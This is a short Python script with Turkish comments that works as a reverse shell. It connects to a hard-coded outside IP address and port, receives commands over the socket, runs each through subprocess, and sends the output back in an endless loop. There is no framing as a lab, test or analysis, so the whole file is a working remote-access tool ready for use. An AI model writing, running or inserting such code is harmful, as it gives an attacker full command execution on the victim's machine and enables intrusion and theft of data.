import socket
import subprocess

HOST = '3.66.38.117'  # Düzenleme yapın
PORT = 19923 # Düzenleme yapın

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

while True:
    # Komut al
    command = client_socket.recv(1024).decode()

    # Komutu çalıştır
    output = subprocess.getoutput(command)

    # Komut çıktısını gönder
    client_socket.send(output.encode())

# Bağlantıyı kapat
client_socket.close()
